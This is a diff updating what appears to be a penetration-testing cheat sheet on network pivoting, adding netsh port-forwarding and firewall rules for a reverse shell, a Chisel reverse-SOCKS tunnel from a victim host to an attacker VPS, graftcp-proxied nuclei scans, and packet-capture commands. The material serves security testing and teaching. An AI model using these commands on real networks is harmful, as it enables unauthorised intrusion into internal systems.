@@ -8,7 +8,7 @@
   * [Local Port Forwarding](#local-port-forwarding)
   * [Remote Port Forwarding](#remote-port-forwarding)
 * [Proxychains](#proxychains)
-* [Graphtcp](#graphtcp)
+* [Graftcp](#graftcp)
 * [Web SOCKS - reGeorg](#web-socks---regeorg)
 * [Web SOCKS - pivotnacci](#web-socks---pivotnacci)
 * [Metasploit](#metasploit)
@@ -20,6 +20,7 @@
 * [RevSocks](#revsocks)
 * [plink](#plink)
 * [ngrok](#ngrok)
+* [Capture a network trace with builtin tools](#capture-a-network-trace-with-builtin-tools)
 * [Basic Pivoting Types](#basic-pivoting-types)
   * [Listen - Listen](#listen---listen)
   * [Listen - Connect](#listen---connect)
@@ -30,8 +31,17 @@
 
 ```powershell
 netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
-
 netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110
+
+# Forward the port 4545 for the reverse shell, and the 80 for the http server for example
+netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545
+netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80
+# Correctly open the port on the machine
+netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80
+netsh advfirewall firewall add rule name="PortForwarding 80" dir=out action=allow protocol=TCP localport=80
+netsh advfirewall firewall add rule name="PortForwarding 4545" dir=in action=allow protocol=TCP localport=4545
+netsh advfirewall firewall add rule name="PortForwarding 4545" dir=out action=allow protocol=TCP localport=4545
+
 ```
 
 1. listenaddress – is a local IP address waiting for a connection.
@@ -82,16 +92,42 @@ socks4 localhost 8080
 
 Set the SOCKS4 proxy then `proxychains nmap -sT 192.168.5.6`
 
-## Graphtcp
+## Graftcp
 
-Same as proxychains, with another mechanism to "proxify" which allow Go applications.
+> A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy.
 
-```powershell
-git clone https://github.com/hmgle/graftcp.git
-cd graftcp && make
-graftcp-local/graftcp-local
-./graftcp chromium-browser
+:warning: Same as proxychains, with another mechanism to "proxify" which allow Go applications.
+
+```ps1
+# https://github.com/hmgle/graftcp
+
+# Create a SOCKS5, using Chisel or another tool and forward it through SSH
+(attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS
+(vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse 
+(victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks 
+
+# Run graftcp and specify the SOCKS5
+(attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080
+(attacker) $ graftcp ./nuclei -u http://172.16.1.24
 ```
+
+Simple configuration file for graftcp
+
+```py
+# https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf
+## Listen address (default ":2233")
+listen = :2233
+loglevel = 1
+
+## SOCKS5 address (default "127.0.0.1:1080")
+socks5 = 127.0.0.1:1080
+# socks5_username = SOCKS5USERNAME
+# socks5_password = SOCKS5PASSWORD
+
+## Set the mode for select a proxy (default "auto")
+select_proxy_mode = auto
+```
+
 
 ## Web SOCKS - reGeorg
 
@@ -206,8 +242,11 @@ $ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa"
 go get -v github.com/jpillora/chisel
 
 # forward port 389 and 88 to hacker computer
-user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 
 user@hacker$ /opt/chisel/chisel server -p 8008 --reverse
+user@victim$ .\chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389 
+
+# SOCKS
+user@victim$ .\chisel.exe client YOUR_IP:8008 R:socks
 ```
 
 ### SharpChisel
@@ -372,7 +411,39 @@ tar xvzf cloudflared-stable-linux-amd64.tgz
 # Expose accessible internal service to the internet
 ./cloudflared tunnel --url <protocol>://<host>:<port>
 ```
-  
+
+## Capture a network trace with builtin tools
+
+* Windows (netsh)
+  ```ps1
+  # start a capture use the netsh command.
+  netsh trace start capture=yes report=disabled tracefile=c:\trace.etl maxsize=16384
+
+  # stop the trace
+  netsh trace stop
+
+  # Event tracing can be also used across a reboots
+  netsh trace start capture=yes report=disabled persistent=yes tracefile=c:\trace.etl maxsize=16384
+
+  # To open the file in Wireshark you have to convert the etl file to the cap file format. Microsoft has written a convert for this task. Download the latest version.
+  etl2pcapng.exe c:\trace.etl c:\trace.pcapng
+
+  # Use filters
+  netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\trace.etl maxsize=16384
+  ```
+* Linux (tcpdump)
+  ```ps1
+  sudo apt-get install tcpdump
+  tcpdump -w 0001.pcap -i eth0
+  tcpdump -A -i eth0
+
+  # capture every TCP packet
+  tcpdump -i eth0 tcp
+
+  # capture everything on port 22
+  tcpdump -i eth0 port 22
+  ```
+
   
 ## Basic Pivoting Types
 
@@ -415,5 +486,7 @@ tar xvzf cloudflared-stable-linux-amd64.tgz
 * [Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
 * [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
 * [Pivoting Meterpreter](https://www.information-security.fr/pivoting-meterpreter/)
-* [Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre Zanni](https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/)
+* 🇫🇷 [Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre ZANNI](https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/) - 🇺🇸 [Overview of network pivoting and tunneling [2022 updated] - Alexandre ZANNI](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)
 * [Red Team: Using SharpChisel to exfil internal network - Shantanu Khandelwal - Jun 8](https://medium.com/@shantanukhande/red-team-using-sharpchisel-to-exfil-internal-network-e1b07ed9b49)
+* [Active Directory - hideandsec](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory)
+* [Windows: Capture a network trace with builtin tools (netsh) - February 22, 2021 Michael Albert](https://michlstechblog.info/blog/windows-capture-a-network-trace-with-builtin-tools-netsh/)
